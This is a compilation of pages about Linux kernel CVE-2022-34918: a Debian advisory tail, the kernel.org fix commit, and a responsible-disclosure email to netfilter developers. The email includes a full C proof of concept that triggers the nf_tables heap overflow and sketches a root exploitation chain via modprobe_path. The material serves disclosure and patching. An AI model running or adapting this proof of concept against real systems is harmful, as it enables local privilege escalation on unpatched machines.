We recommend that you upgrade your linux packages.

For the detailed security status of linux please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/linux>

Further information about Debian Security Advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://www.debian.org/security/>

Mailing list: debian-security-announce@lists.debian.org
-----BEGIN PGP SIGNATURE-----

iQIzBAEBCgAdFiEEtuYvPRKsOElcDakFEMKTtsN8TjYFAmLgSLUACgkQEMKTtsN8
TjYbNA//Yr3vv1aAt9hXCpI/r4QJRZ23CxQL1so2nBV7c5q7rMdbr42+0seQl/33
pc5dikZ79MzSxShQhHYWRYrya3alXSRmgDxe5rICnSLF8+nHRpQccGfPTFDlKLOg
4sNfvonxOUKEgfi5Rqd5FtWnhCtAX+I26lI/PnA4ciQE+VA4l6YeaxJnL42HugYw
q4Y8mEprEW7aZSpcK2Nk2ixXPNwJlAssvbIHvNJsaRP4X4w18iHSI/8AYlymkvfa
Eyf4vEQfKce7UQB3JoIfdJQFgX3cvz6oMXZ6q9S4i5GlK7GeWSo2NRfE3ulrlFOw
tCFfVN6V9tVQtuKqNma5tn4F8FG8YLafDzC0IwLq+JswrTbs5EQ/wzJhNnkXP86J
hSPpMeVmT/mBihjv6PRilOraOX8mACJSQKuWkDSc9VvZCeCUo0uc31d4/WfzaOCM
rxaMBHuQW7mq/Dd6htlbbGyUjWC9Zt5Wb+GtzXIb6jUOISUagMI4lnMVgOB4Tyhl
FiPp4PWz7jGVsrN/l/5JsPxhQd2wPmPC2zS2REunvXOMZxCgwOMB3aW5oJSufHTa
c/f9Z86s/HFZxjwJ3mEcebAzVAvGPfg9yuiD6nEEeYSTLhTCC5UTGw4WVZHjNtxB
3yn8Ju2Nqu3NbmyAlye/Y9wAlw3nIL3dkFkRU/NgzncnuXT7oLw=
=DZil
-----END PGP SIGNATURE-----

```

---



=== Content from git.kernel.org_78827ad8_20250108_134524.html ===


| [cgit logo](/) | [index](/) : [kernel/git/netdev/net.git](/pub/scm/linux/kernel/git/netdev/net.git/) | main |
| --- | --- | --- |
| Netdev Group's networking tree | Netdev Group |

| [about](/pub/scm/linux/kernel/git/netdev/net.git/about/)[summary](/pub/scm/linux/kernel/git/netdev/net.git/)[refs](/pub/scm/linux/kernel/git/netdev/net.git/refs/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6)[log](/pub/scm/linux/kernel/git/netdev/net.git/log/)[tree](/pub/scm/linux/kernel/git/netdev/net.git/tree/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6)[commit](/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6)[diff](/pub/scm/linux/kernel/git/netdev/net.git/diff/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6)[stats](/pub/scm/linux/kernel/git/netdev/net.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Pablo Neira Ayuso <pablo@netfilter.org> | 2022-07-02 04:16:30 +0200 |
| --- | --- | --- |
| committer | Pablo Neira Ayuso <pablo@netfilter.org> | 2022-07-02 21:04:10 +0200 |
| commit | [7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6](/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6) ([patch](/pub/scm/linux/kernel/git/netdev/net.git/patch/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6)) | |
| tree | [a4418248c8ef89042ae48ab8e2cb11da4f59da2c](/pub/scm/linux/kernel/git/netdev/net.git/tree/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6) | |
| parent | [f8ebb3ac881b17712e1d5967c97ab1806b16d3d6](/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f8ebb3ac881b17712e1d5967c97ab1806b16d3d6) ([diff](/pub/scm/linux/kernel/git/netdev/net.git/diff/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6&id2=f8ebb3ac881b17712e1d5967c97ab1806b16d3d6)) | |
| download | [net-7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6.tar.gz](/pub/scm/linux/kernel/git/netdev/net.git/snapshot/net-7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6.tar.gz) | |

netfilter: nf\_tables: stricter validation of element dataMake sure element data type and length do not mismatch the one specified
by the set declaration.
Fixes: 7d7402642eaf ("netfilter: nf\_tables: variable sized set element keys / data")
Reported-by: Hugues ANGUELKOV <hanguelkov@randorisec.fr>
Signed-off-by: Pablo Neira Ayuso <pablo@netfilter.org>
[Diffstat](/pub/scm/linux/kernel/git/netdev/net.git/diff/?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6)

| -rw-r--r-- | [net/netfilter/nf\_tables\_api.c](/pub/scm/linux/kernel/git/netdev/net.git/diff/net/netfilter/nf_tables_api.c?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6) | 9 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 8 insertions, 1 deletions

| diff --git a/net/netfilter/nf\_tables\_api.c b/net/netfilter/nf\_tables\_api.cindex 51144fc66889b5..d6b59beab3a986 100644--- a/[net/netfilter/nf\_tables\_api.c](/pub/scm/linux/kernel/git/netdev/net.git/tree/net/netfilter/nf_tables_api.c?id=f8ebb3ac881b17712e1d5967c97ab1806b16d3d6)+++ b/[net/netfilter/nf\_tables\_api.c](/pub/scm/linux/kernel/git/netdev/net.git/tree/net/netfilter/nf_tables_api.c?id=7e6bc1f6cabcd30aba0b11219d8e01b952eacbb6)@@ -5213,13 +5213,20 @@ static int nft\_setelem\_parse\_data(struct nft\_ctx \*ctx, struct nft\_set \*set, struct nft\_data \*data, struct nlattr \*attr) {+ u32 dtype; int err;  err = nft\_data\_init(ctx, data, NFT\_DATA\_VALUE\_MAXLEN, desc, attr); if (err < 0) return err; - if (desc->type != NFT\_DATA\_VERDICT && desc->len != set->dlen) {+ if (set->dtype == NFT\_DATA\_VERDICT)+ dtype = NFT\_DATA\_VERDICT;+ else+ dtype = NFT\_DATA\_VALUE;++ if (dtype != desc->type ||+ set->dlen != desc->len) { nft\_data\_release(data, desc->type); return -EINVAL; } |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-08 13:44:01 +0000



=== Content from lore.kernel.org_c1418f83_20250108_134524.html ===

```
[netfilter-devel.vger.kernel.org archive mirror](../../?t=20220701154326)
 [help](../../_/text/help/) / [color](../../_/text/color/) / [mirror](../../_/text/mirror/) / [Atom feed](../../new.atom)
```
```
[*](#ea10c0f58da9851b3f353b126fe8e3f85c7dbef07) [vs] Netfilter vulnerability disclosure
@ 2022-07-01 15:43 Hugues ANGUELKOV
  [0 siblings, 0 replies; only message in thread](#ra10c0f58da9851b3f353b126fe8e3f85c7dbef07)
From: Hugues ANGUELKOV @ 2022-07-01 15:43 UTC ([permalink](../../cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/) / [raw](../../cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/raw))
  To: linux-distros
  Cc: security, pablo, kadlec, fw, [netfilter-devel](../../../netfilter-devel/?t=20220701154326), coreteam, davy,
	amongodin

Hello everyone,

One of our collaborators at RandoriSec, Arthur Mongodin found a
vulnerability within the netfilter subsystem during his internship.
Successful exploitation of this bug leads to a Local Privilege
Escalation (LPE) to the `root` user, as tested on Ubuntu server 22.04
(Linux 5.15.0-39-generic).
This vulnerability is a heap buffer overflow due to a weak check and has
been introduced within the commit
[fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81](<https://github.com/torvalds/linux/commit/fdb9c405e35bdc6e305b9b4e20ebc141ed14fc81>),
it affects the Linux kernel since the version 5.8 and is still present
today.

The heap buffer overflow happens in the function `nft_set_elem_init`
(`/net/netfilter/nf_tables_api.c`)

```c
void *nft_set_elem_init(const struct nft_set *set,
             const struct nft_set_ext_tmpl *tmpl,
             const u32 *key, const u32 *key_end,
             const u32 *data, u64 timeout, u64 expiration, gfp_t gfp)
{
     struct nft_set_ext *ext;
     void *elem;

     elem = kzalloc(set->ops->elemsize + tmpl->len,
gfp);                    <===== (0)
     if (elem == NULL)
         return NULL;

     ...

     if (nft_set_ext_exists(ext, NFT_SET_EXT_DATA))
         memcpy(nft_set_ext_data(ext), data,
set->dlen);                     <===== (1)

     ...

     return elem;
}
```

A buffer is allocated at (0) without taking in consideration the value
`set->dlen` used at (1) for the copy.
The computation of the needed space (`tmpl->len`) is realized before the
call to `nft_set_elem_init`, however,
  a weak check on a user input allows a user to provide an element with
a data length lower than the `set->dlen` for the allocation.
This check is located within the function `nft_set_elem_parse_data`
(`/net/netfilter/nf_tables_api.c`).

```c
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
                   struct nft_data_desc *desc,
                   struct nft_data *data,
                   struct nlattr *attr)
{

     ...

     if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen)
{         <===== (2)
         nft_data_release(data, desc->type);
         return -EINVAL;
     }

     return 0;
}
```

As we can see at (2), if the data type is `NFT_DATA_VERDICT`, the
comparison between `desc->len` and `set->dlen` is not done.
Finally, `desc->len` it is used to compute `tmpl->len` at (0) and
`set->dlen` for the copy at (1) and they can be different.

The vulnerable code path can be reached if the kernel is built with the
configuration `CONFIG_NETFILTER`, `CONFIG_NF_TABLES` enabled.
To exploit the vulnerability, an attacker may need to obtain an
unprivileged user namespace to gain the capability `CAP_NET_ADMIN`
(`CONFIG_USER_NS` and `CONFIG_NET_NS` enabled, and
`kernel.unprivileged_userns_clone = 1`).

The exploitation was simplified by the use of an uninitialized variable
in `nft_add_set_elem`:

```c
static int nft_add_set_elem(struct nft_ctx *ctx, struct nft_set *set,
const struct nlattr *attr, u32 nlmsg_flags)
{
   struct nft_set_elem elem;
   ...
}
```

First we add an `elem` with the type `NFT_DATA_VALUE`, then `elem.data`
will be filled `set->dlen` bytes, the second iteration will only erase
the first bytes of `elem.data` with an element of type `NFT_DATA_VERDICT`.

We get an infoleak by overwriting the field `datalen` of
an`user_key_payload` structure. The write primitive can be obtained with
an unlinking attack on the `list_head` of the `simple_xattr` structure.
We targeted the `modprobe_path` to gain root permission by executing a
shell wrapper.

The following Proof of Concept (PoC) will trigger KASAN on the upstream
kernel (Linux 5.19.0-rc4)

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <sched.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <arpa/inet.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nfnetlink.h>
#include <linux/netfilter/nf_tables.h>

#define do_error_exit(msg) do {perror("[-] " msg); exit(EXIT_FAILURE); }
while(0)

#define ID 1337
#define SET_NAME "name\0\0\0"
#define LEAK_SET_NAME "leak\0\0\0"
#define TABLE "table\0\0"

#define U32_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint32_t))
#define U64_NLA_SIZE (sizeof(struct nlattr) + sizeof(uint64_t))
#define S8_NLA_SIZE (sizeof(struct nlattr) + 8)
#define NLA_BIN_SIZE(x) (sizeof(struct nlattr) + x)
#define NLA_ATTR(attr) ((void *)attr + NLA_HDRLEN)

#define TABLEMSG_SIZE NLMSG_SPACE(sizeof(struct nfgenmsg) +
sizeof(struct nlattr) + 8)

#define KMALLOC64_KEYLEN (64 - 8 - 12 - 16) // Max size - elemsize -
sizeof(nft_set_ext)(align) - min datasize

#define BUFFER_SIZE 64

uint8_t buffer[BUFFER_SIZE] = {0};

void new_ns(void) {

     if (unshare(CLONE_NEWUSER))
         do_error_exit("unshare(CLONE_NEWUSER)");

     if (unshare(CLONE_NEWNET))
         do_error_exit("unshare(CLONE_NEWNET)");
}

struct nlmsghdr *get_batch_begin_nlmsg(void) {

     struct nlmsghdr *nlh = (struct nlmsghdr
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));
     struct nfgenmsg *nfgm = (struct nfgenmsg *)NLMSG_DATA(nlh);

     if (!nlh)
         do_error_exit("malloc");

     memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
     nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
     nlh->nlmsg_type = NFNL_MSG_BATCH_BEGIN;
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = 0;
     nlh->nlmsg_seq = 0;

     /* Used to access to the netfilter tables subsystem */
     nfgm->res_id = NFNL_SUBSYS_NFTABLES;

     return nlh;
}

struct nlmsghdr *get_batch_end_nlmsg(void) {

     struct nlmsghdr *nlh = (struct nlmsghdr
*)malloc(NLMSG_SPACE(sizeof(struct nfgenmsg)));

     if (!nlh)
         do_error_exit("malloc");

     memset(nlh, 0, NLMSG_SPACE(sizeof(struct nfgenmsg)));
     nlh->nlmsg_len = NLMSG_SPACE(sizeof(struct nfgenmsg));
     nlh->nlmsg_type = NFNL_MSG_BATCH_END;
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = NLM_F_REQUEST;
     nlh->nlmsg_seq = 0;

     return nlh;
}

struct nlattr *set_nested_attr(struct nlattr *attr, uint16_t type,
uint16_t data_len) {
     attr->nla_type = type;
     attr->nla_len = NLA_ALIGN(data_len + sizeof(struct nlattr));
     return (void *)attr + sizeof(struct nlattr);
}

struct nlattr *set_u32_attr(struct nlattr *attr, uint16_t type, uint32_t
value) {
     attr->nla_type = type;
     attr->nla_len = U32_NLA_SIZE;
     *(uint32_t *)NLA_ATTR(attr) = htonl(value);

     return (void *)attr + U32_NLA_SIZE;
}

struct nlattr *set_str8_attr(struct nlattr *attr, uint16_t type, const
char name[8]) {
     attr->nla_type = type;
     attr->nla_len = S8_NLA_SIZE;
     memcpy(NLA_ATTR(attr), name, 8);

     return (void *)attr + S8_NLA_SIZE;
}

struct nlattr *set_binary_attr(struct nlattr *attr, uint16_t type,
uint8_t *buffer, uint64_t buffer_size) {
     attr->nla_type = type;
     attr->nla_len = NLA_BIN_SIZE(buffer_size);
     memcpy(NLA_ATTR(attr), buffer, buffer_size);

     return (void *)attr + NLA_ALIGN(NLA_BIN_SIZE(buffer_size));
}
void create_table(int sock, const char *name) {
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
     struct iovec iov[3];
     struct nlmsghdr *nlh_batch_begin;
     struct nlmsghdr *nlh;
     struct nlmsghdr *nlh_batch_end;
     struct nlattr *attr;
     struct nfgenmsg *nfm;

     /* Destination preparation */
     memset(&dest_snl, 0, sizeof(dest_snl));
     dest_snl.nl_family = AF_NETLINK;
     memset(&msg, 0, sizeof(msg));

     /* Netlink batch_begin message preparation */
     nlh_batch_begin = get_batch_begin_nlmsg();

     /* Netlink table message preparation */
     nlh = (struct nlmsghdr *)malloc(TABLEMSG_SIZE);
     if (!nlh)
         do_error_exit("malloc");

     memset(nlh, 0, TABLEMSG_SIZE);
     nlh->nlmsg_len = TABLEMSG_SIZE;
     nlh->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWTABLE;
     nlh->nlmsg_pid = getpid();
     nlh->nlmsg_flags = NLM_F_REQUEST;
     nlh->nlmsg_seq = 0;

     nfm = NLMSG_DATA(nlh);
     nfm->nfgen_family = NFPROTO_INET;

     /** Prepare associated attribute **/
     attr = (void *)nlh + NLMSG_SPACE(sizeof(struct nfgenmsg));
     set_str8_attr(attr, NFTA_TABLE_NAME, name);

     /* Netlink batch_end message preparation */
     nlh_batch_end = get_batch_end_nlmsg();

     /* IOV preparation */
     memset(iov, 0, sizeof(struct iovec) * 3);
     iov[0].iov_base = (void *)nlh_batch_begin;
     iov[0].iov_len = nlh_batch_begin->nlmsg_len;
     iov[1].iov_base = (void *)nlh;
     iov[1].iov_len = nlh->nlmsg_len;
     iov[2].iov_base = (void *)nlh_batch_end;
     iov[2].iov_len = nlh_batch_end->nlmsg_len;

     /* Message header preparation */
     msg.msg_name = (void *)&dest_snl;
     msg.msg_namelen = sizeof(struct sockaddr_nl);
     msg.msg_iov = iov;
     msg.msg_iovlen = 3;

     sendmsg(sock, &msg, 0);

     /* Free used structures */
     free(nlh_batch_end);
     free(nlh);
     free(nlh_batch_begin);
}

void create_set(int sock, const char *set_name, uint32_t set_keylen,
uint32_t data_len, const char *table_name, uint32_t id) {
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
     struct nlmsghdr *nlh_batch_begin;
     struct nlmsghdr *nlh_payload;
     struct nlmsghdr *nlh_batch_end;
     struct nfgenmsg *nfm;
     struct nlattr *attr;
     uint64_t nlh_payload_size;
     struct iovec iov[3];

     /* Prepare the netlink sockaddr for msg */
     memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
     dest_snl.nl_family = AF_NETLINK;

     /* First netlink message: batch_begin */
     nlh_batch_begin = get_batch_begin_nlmsg();

     /* Second netlink message : Set attributes */
     nlh_payload_size = sizeof(struct
nfgenmsg);                                     // Mandatory
     nlh_payload_size +=
S8_NLA_SIZE;                                                //
NFTA_SET_TABLE
     nlh_payload_size +=
S8_NLA_SIZE;                                                // NFTA_SET_NAME
     nlh_payload_size +=
U32_NLA_SIZE;                                               // NFTA_SET_ID
     nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_KEY_LEN
     nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_FLAGS
     nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_DATA_TYPE
     nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_DATA_LEN
     nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

     /** Allocation **/
     nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
     if (!nlh_payload)
         do_error_exit("malloc");

     memset(nlh_payload, 0, nlh_payload_size);

     /** Fill the required fields **/
     nlh_payload->nlmsg_len = nlh_payload_size;
     nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) | NFT_MSG_NEWSET;
     nlh_payload->nlmsg_pid = getpid();
     nlh_payload->nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE;
     nlh_payload->nlmsg_seq = 0;

     /** Setup the nfgenmsg **/
     nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
     nfm->nfgen_family =
NFPROTO_INET;                                               // Verify if
it is compulsory

     /** Setup the attributes */
     attr = (struct nlattr *)((void *)nlh_payload +
NLMSG_SPACE(sizeof(struct nfgenmsg)));
     attr = set_str8_attr(attr, NFTA_SET_TABLE, table_name);
     attr = set_str8_attr(attr, NFTA_SET_NAME, set_name);
     attr = set_u32_attr(attr, NFTA_SET_ID, id);
     attr = set_u32_attr(attr, NFTA_SET_KEY_LEN, set_keylen);
     attr = set_u32_attr(attr, NFTA_SET_FLAGS, NFT_SET_MAP);
     attr = set_u32_attr(attr, NFTA_SET_DATA_TYPE, 0);
     set_u32_attr(attr, NFTA_SET_DATA_LEN, data_len);

     /* Last netlink message: batch_end */
     nlh_batch_end = get_batch_end_nlmsg();

     /* Setup the iovec */
     memset(iov, 0, sizeof(struct iovec) * 3);
     iov[0].iov_base = (void *)nlh_batch_begin;
     iov[0].iov_len = nlh_batch_begin->nlmsg_len;
     iov[1].iov_base = (void *)nlh_payload;
     iov[1].iov_len = nlh_payload->nlmsg_len;
     iov[2].iov_base = (void *)nlh_batch_end;
     iov[2].iov_len = nlh_batch_end->nlmsg_len;

     /* Prepare the message to send */
     memset(&msg, 0, sizeof(struct msghdr));
     msg.msg_name = (void *)&dest_snl;
     msg.msg_namelen = sizeof(struct sockaddr_nl);
     msg.msg_iov = iov;
     msg.msg_iovlen = 3;

     /* Send message */
     sendmsg(sock, &msg, 0);

     /* Free allocated memory */
     free(nlh_batch_end);
     free(nlh_payload);
     free(nlh_batch_begin);
}

void add_elem_to_set(int sock, const char *set_name, uint32_t
set_keylen, const char *table_name, uint32_t id, uint32_t data_len,
uint8_t *data) {
     struct msghdr msg;
     struct sockaddr_nl dest_snl;
     struct nlmsghdr *nlh_batch_begin;
     struct nlmsghdr *nlh_payload;
     struct nlmsghdr *nlh_batch_end;
     struct nfgenmsg *nfm;
     struct nlattr *attr;
     uint64_t nlh_payload_size;
     uint64_t nested_attr_size;
     struct iovec iov[3];

     /* Prepare the netlink sockaddr for msg */
     memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
     dest_snl.nl_family = AF_NETLINK;

     /* First netlink message: batch */
     nlh_batch_begin = get_batch_begin_nlmsg();

     /* Second netlink message : Set attributes */

     /** Precompute the size of the nested field **/
     nested_attr_size = 0;

     nested_attr_size += sizeof(struct
nlattr);                                      // Englobing attribute
     nested_attr_size += sizeof(struct
nlattr);                                      // NFTA_SET_ELEM_KEY
     nested_attr_size +=
NLA_BIN_SIZE(set_keylen);                                      //
NFTA_DATA_VALUE
     nested_attr_size += sizeof(struct
nlattr);                                      // NFTA_SET_ELEM_DATA
     nested_attr_size += sizeof(struct
nlattr);                                      // NFTA_DATA_VERDICT
     nested_attr_size +=
U32_NLA_SIZE;                                               //
NFTA_VERDICT_CODE

     nlh_payload_size = sizeof(struct
nfgenmsg);                                     // Mandatory
     nlh_payload_size += sizeof(struct
nlattr);                                      // NFTA_SET_ELEM_LIST_ELEMENTS
     nlh_payload_size +=
nested_attr_size;                                           // All the
stuff described above
     nlh_payload_size +=
S8_NLA_SIZE;                                                //
NFTA_SET_ELEM_LIST_TABLE
     nlh_payload_size +=
S8_NLA_SIZE;                                                //
NFTA_SET_ELEM_LIST_SET
     nlh_payload_size +=
U32_NLA_SIZE;                                               //
NFTA_SET_ELEM_LIST_SET_ID
     nlh_payload_size = NLMSG_SPACE(nlh_payload_size);

     /** Allocation **/
     nlh_payload = (struct nlmsghdr *)malloc(nlh_payload_size);
     if (!nlh_payload) {
         do_error_exit("malloc");
     }
     memset(nlh_payload, 0, nlh_payload_size);

     /** Fill the required fields **/
     nlh_payload->nlmsg_len = nlh_payload_size;
     nlh_payload->nlmsg_type = (NFNL_SUBSYS_NFTABLES << 8) |
NFT_MSG_NEWSETELEM;
     nlh_payload->nlmsg_pid = getpid();
     nlh_payload->nlmsg_flags = NLM_F_REQUEST;
     nlh_payload->nlmsg_seq = 0;

     /** Setup the nfgenmsg **/
     nfm = (struct nfgenmsg *)NLMSG_DATA(nlh_payload);
     nfm->nfgen_family = NFPROTO_INET;

     /** Setup the attributes */
     attr = (struct nlattr *)((void *)nlh_payload +
NLMSG_SPACE(sizeof(struct nfgenmsg)));
     attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
     attr = set_str8_attr(attr, NFTA_SET_ELEM_LIST_SET, set_name);
     attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
     attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS,
nested_attr_size);

     attr = set_nested_attr(attr, 0, nested_attr_size - 4);
     attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY,
NLA_BIN_SIZE(set_keylen));
     attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)buffer,
set_keylen);
     attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE +
sizeof(struct nlattr));
     attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
     set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);

     /* Last netlink message: End of batch */
     nlh_batch_end = get_batch_end_nlmsg();

     /* Setup the iovec */
     memset(iov, 0, sizeof(struct iovec) * 3);
     iov[0].iov_base = (void *)nlh_batch_begin;
     iov[0].iov_len = nlh_batch_begin->nlmsg_len;
     iov[1].iov_base = (void *)nlh_payload;
     iov[1].iov_len = nlh_payload->nlmsg_len;
     iov[2].iov_base = (void *)nlh_batch_end;
     iov[2].iov_len = nlh_batch_end->nlmsg_len;

     /* Prepare the message to send */
     memset(&msg, 0, sizeof(struct msghdr));
     msg.msg_name = (void *)&dest_snl;
     msg.msg_namelen = sizeof(struct sockaddr_nl);
     msg.msg_iov = iov;
     msg.msg_iovlen = 3;

     /* Send message */
     sendmsg(sock, &msg, 0);

     /* Free allocated memory */
     free(nlh_batch_end);
     free(nlh_payload);
     free(nlh_batch_begin);
}

int main(int argc, char **argv) {

     int sock;
     struct sockaddr_nl snl;
     struct leak *bases;

     new_ns();
     printf("[+] Get CAP_NET_ADMIN capability\n");

     /* Netfilter netlink socket creation */
     if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
         do_error_exit("socket");
     }
     printf("[+] Netlink socket created\n");

     // Binding
     memset(&snl, 0, sizeof(snl));
     snl.nl_family = AF_NETLINK;
     snl.nl_pid = getpid();
     if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
         do_error_exit("bind");
     }
     printf("[+] Netlink socket bound\n");

     /* Create a netfilter table */
     create_table(sock, TABLE);
     printf("[+] Table created\n");

     /*  Create a netfilter set */
     create_set(sock, SET_NAME, KMALLOC64_KEYLEN, BUFFER_SIZE, TABLE, ID);
     printf("[+] Set created\n");

     /* Prepare the payload for the write primitive */
     add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE, ID,
BUFFER_SIZE, buffer);
     printf("[+] Overflow done\n");

     return EXIT_SUCCESS;
}
```

We propose the following patch. We think that the comparison must be
mandatory and may be enough for patch this vulnerability.
However, we are not experts at Linux kernel programming and we are still
unsure if it will not break something along the way.
This patch was applied on the current upstream version.

```diff
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
                   struct nft_data_desc *desc,
                   struct nft_data *data,
                   struct nlattr *attr)
{

     ...

-    if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
+    if (desc->len != set->dlen) {

                 nft_data_release(data, desc->type);
         return -EINVAL;
     }

     return 0;
}
```

We would like to reserve a CVE for this vulnerability.

Also, we would like to release the LPE exploit targeting Ubuntu server
along with a more detailed blogpost.
If needed, we can supply the exploit. Depending of your workload, we can
suggest the August, 15th 2022 as a potential date for public disclosure.

Thank you for your attention and we also would like to thank you for all
the work put on the Linux kernel.

[^](#ma10c0f58da9851b3f353b126fe8e3f85c7dbef07) [permalink](../../cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/) [raw](../../cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/raw) [reply](../../cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/#R)	[[flat](../../cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/T/#u)|[nested](../../cd9428b6-7ffb-dd22-d949-d86f4869f452%40randorisec.fr/t/#u)] [only message in thread](#ra10c0f58da9851b3f353b126fe8e3f85c7dbef07)
```

---

```
only message in thread, other threads:[[~2022-07-01 15:43 UTC](../../?t=20220701154326) | [newest](../../)]

Thread overview: (only message) (download: [mbox.gz](../t.mbox.gz) follow: [Atom feed](../t.atom)
-- links below jump to the message on this page --
2022-07-01 15:43 [[vs] Netfilter vulnerability disclosure](#ma10c0f58da9851b3f353b126fe8e3f85c7dbef07) Hugues ANGUELKOV

```

---

```
This is a public inbox, see [mirroring instructions](../../_/text/mirror/)
for how to clone and mirror all data and code used for this inbox;
as well as URLs for NNTP newsgroup(s).
```


=== Content from www.openwall.com_8cff9b70_20250108_134523.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[<thread-prev]](../../../2022/07/05/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20220806185940.GA8784@openwall.com>
Date: Sat, 6 Aug 2022 20:59:40 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Cc: Hugues ANGUELKOV <hanguelkov@...dorisec.fr>
Subject: Re: Linux kernel: Netfilter heap buffer overflow in nft_set_elem_init

On Tue, Jul 05, 2022 at 08:56:28AM +0200, Marcus Meissner wrote:
> Mitre has assigned CVE-2022-34918 to this issue.

